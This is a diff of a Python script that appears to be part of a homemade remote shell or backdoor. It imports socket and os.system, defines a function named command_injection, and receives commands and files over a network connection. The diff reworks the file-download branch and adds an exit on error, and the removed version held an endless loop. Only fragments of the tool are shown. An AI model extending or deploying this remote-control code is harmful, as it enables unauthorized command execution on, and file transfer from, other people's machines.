@@ -1,5 +1,6 @@
 import socket as st
 from os import system
+from sys import exit
 
 def command_injection(cmd:str,client):
     try:
@@ -28,14 +29,14 @@ while con:
         if not cmd:
             continue
         elif 'download' in cmd:
-            getfiles = con.recv(4096)
-            with open('server.download','wb') as file:
-                while True:
-                    if not getfiles:
-                        break
-                    file.write(getfiles)
-                file.close()
-                
+            try:
+                getfiles = con.recv(4096)
+                getfile = open('server.down','wb')
+                getfile.write(getfiles)
+                getfile.close()
+            except Exception as err:
+                print(err)
+                exit(1)
             
         elif cmd in ('quite','exit'):
             con.close()
